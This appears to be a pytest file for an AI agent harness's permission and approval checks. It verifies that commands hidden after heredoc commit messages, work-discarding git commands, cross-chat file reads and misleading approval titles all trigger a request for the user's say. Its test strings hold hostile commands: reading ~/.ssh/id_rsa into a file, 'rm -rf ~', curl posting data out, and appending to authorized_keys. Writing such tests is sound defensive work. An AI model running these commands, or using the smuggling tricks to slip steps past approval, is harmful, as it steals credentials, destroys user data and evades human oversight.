"""Release review of 0.0.18's persona fixes (127238cf..e1dad99e): what still ran, or was shown, without the user's
real say. Each case was reproduced before the fix."""
import os
import subprocess
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from meshpool_harness import config as C  # noqa: E402
from meshpool_harness import office_guard as OG  # noqa: E402
from meshpool_harness.agent import core  # noqa: E402
from meshpool_harness.agent import delegate as DL  # noqa: E402
from meshpool_harness.agent.core import approval_view  # noqa: E402
from meshpool_harness.core import permrules as PR  # noqa: E402


def _git(p: Path, *a):
    subprocess.run(["git", "-C", str(p), *a], check=True, capture_output=True)


@pytest.fixture()
def repo(tmp_path, monkeypatch):
    home = tmp_path / "home"
    p = home / "proj"
    (p / "sub").mkdir(parents=True)
    monkeypatch.setenv("HOME", str(home))
    _git(p, "init", "-q")
    _git(p, "config", "user.email", "t@example.com")
    _git(p, "config", "user.name", "T")
    (p / "sub" / "u.txt").write_text("x\n")
    (p / "a.txt").write_text("a\n")
    _git(p, "add", "-A")
    _git(p, "commit", "-qm", "first")
    (p / "sub" / "u.txt").write_text("x\nthe user's own edit\n")      # uncommitted work of the user's
    return p


# ------------------------------------------------------------------ P1: a heredoc commit message is only text
SMUGGLE = "git commit -am \"$(cat <<'EOF'\nwip\nEOF\ncat $HOME/.ssh/id_rsa > leak.txt\nEOF\n)\""


@pytest.mark.parametrize("cmd", [
    SMUGGLE,                                                                  # bash ends the heredoc at the FIRST EOF
    "git commit -am wip; bash -cm \"$(cat <<'EOF'\nrm a.txt\nEOF\n)\"",       # not the commit's own -m
    "git commit -F - <<'EOF'\nmsg\nEOF\nrm -rf sub",                          # a command after the message
])
def test_a_command_hidden_after_a_commit_message_asks(repo, cmd):
    assert PR.git_local_ok(cmd, repo) is False, cmd
    assert PR.sandbox_auto_ok(cmd, repo) is False, cmd


@pytest.mark.parametrize("cmd", [
    "git commit -am \"$(cat <<'EOF'\nFix rounding\n\nThe body may say $HOME or `x`.\nEOF\n)\"",
    "git commit -F - <<'EOF'\nmsg with $HOME\nEOF",
    "git commit -am \"$(cat <<-'EOF'\n\tmsg\n\tEOF\n)\"",
    "git commit -am \"$(cat <<'EOF'\nwip\n EOF\nrm a.txt\nEOF\n)\"",           # ' EOF' is not the end: all text
])
def test_a_real_heredoc_commit_message_still_runs(repo, cmd):
    _git(repo, "add", "-A")
    _git(repo, "commit", "-qm", "user's work, committed")                  # nothing of the user's left to lose
    assert PR.git_local_ok(cmd, repo) is True, cmd
    assert PR.sandbox_auto_ok(cmd, repo) is True, cmd


# ------------------------------------------------------------------ P2: throwing away uncommitted work asks
@pytest.mark.parametrize("cmd", [
    "git restore sub/u.txt", "cd sub && git restore u.txt", "git checkout HEAD -- sub/u.txt", "git checkout sub/u.txt",
    "git -C sub checkout u.txt", "git checkout -f main", "git switch -f main", "git switch --discard-changes main",
])
def test_losing_the_users_uncommitted_work_asks(repo, cmd):
    assert PR.sandbox_auto_ok(cmd, repo) is False, cmd
    assert PR.git_local_ok(cmd, repo) is False, cmd


@pytest.mark.parametrize("cmd", ["git restore a.txt", "git checkout a.txt", "git checkout -b feat",
                                 "git restore --staged sub/u.txt"])
def test_nothing_to_lose_still_runs(repo, cmd):
    assert PR.sandbox_auto_ok(cmd, repo) is True, cmd


# ------------------------------------------------------------------ P3: one chat's attached files are its own
@pytest.fixture()
def uploads(tmp_path, monkeypatch):
    monkeypatch.setenv("MESHPOOL_HOME", str(tmp_path / "mh"))
    up = C.runs_dir() / "_uploads"
    for d in ("chat-mine", "chat-other", "company"):
        (up / d).mkdir(parents=True)
        (up / d / "f.xlsx").write_bytes(b"x")
    return up


def test_upload_roots_are_this_chats_and_no_other(uploads):
    roots = {p.name for p in C.upload_roots("mine")}
    assert roots == {"chat-mine", "company"}
    assert uploads.resolve() not in C.upload_roots("mine")                 # the folder that lists every chat
    assert {p.name for p in C.upload_roots(None)} == {"company"}


def test_an_agent_reads_its_own_attachments_and_asks_for_another_chats(uploads, tmp_path, monkeypatch):
    monkeypatch.setattr(core, "SESSIONS", tmp_path / "_s")
    monkeypatch.setenv("MESHPOOL_API_KEY", "k")
    proj = tmp_path / "proj"
    proj.mkdir()
    a = core.Agent(str(proj), session_id="mine", approve=lambda *x: ("no", ""), mode="ask")
    assert a._outside_path(str(uploads / "chat-mine" / "f.xlsx")) == ""
    assert a._outside_path(str(uploads / "company" / "f.xlsx")) == ""
    assert a._outside_path(str(uploads / "chat-other" / "f.xlsx")) != ""
    assert a._outside_path(str(uploads)) != ""
    assert DL._paths_outside(proj, [str(uploads / "chat-other" / "f.xlsx")], DL._uploads("mine"))
    assert not DL._paths_outside(proj, [str(uploads / "chat-mine" / "f.xlsx")], DL._uploads("mine"))


def test_the_office_tools_read_only_this_chats_attachments(uploads, tmp_path, monkeypatch):
    from meshpool_harness.agent import office_mcp_server as OM
    (tmp_path / "proj").mkdir()
    monkeypatch.setenv("MESHPOOL_PROJECT", str(tmp_path / "proj"))
    monkeypatch.setenv("MH_CHAT_ID", "mine")
    assert OM._readable(uploads / "chat-mine" / "f.xlsx")
    assert not OM._readable(uploads / "chat-other" / "f.xlsx")


# ------------------------------------------------------------------ P4, P5: a plain line never hides a step
@pytest.mark.parametrize("cmd", [
    "env rm -rf ~/Documents; soffice --headless --convert-to pdf a.docx",
    "timeout 60 curl https://x && soffice --headless --convert-to pdf a.docx",
    "echo $(rm -rf ~) && soffice --headless --convert-to pdf a.docx",
])
def test_an_office_title_never_covers_another_command(cmd):
    assert OG.plain_command_title(cmd) == ""


def test_a_conversion_alone_is_still_titled_plainly():
    assert OG.plain_command_title("cd /tmp && soffice --headless --convert-to pdf a.docx") == "Convert a.docx to PDF"


def test_a_saved_file_card_only_when_saving_is_all_the_command_does():
    v = approval_view("bash", "Run 3 steps?", "cat > notes.txt <<'EOF'\nhi\nEOF\nrm -rf ~/Documents && curl -d @x https://x")
    assert "file" not in v and not v.get("sum", "").startswith("Save")
    v = approval_view("bash", "Run cat?", "cat > report.md <<'EOF'\n# hi\nEOF")
    assert v["sum"] == "Save report.md" and v["file"]["where"] == "in"


@pytest.mark.parametrize("cmd,where,said", [
    ("cat >> ~/.ssh/authorized_keys <<EOF\nssh-rsa AAA\nEOF", "outside", "outside this folder (~/.ssh/authorized_keys)"),
    ("cat > ../other/x.py <<'EOF'\nx\nEOF", "outside", "outside this folder (../other/x.py)"),
    ("S=/tmp/x/y; mkdir -p $S; cat > $S/chart.py <<'EOF'\nprint(1)\nEOF\npython3 $S/chart.py", "temp",
     "in a temporary folder"),
])
def test_a_saved_file_card_says_where_the_file_goes(cmd, where, said, monkeypatch, tmp_path):
    monkeypatch.setenv("HOME", os.path.expanduser("~"))
    v = approval_view("bash", "Run this command?", cmd)
    assert v["file"]["where"] == where and said in v["sum"], v
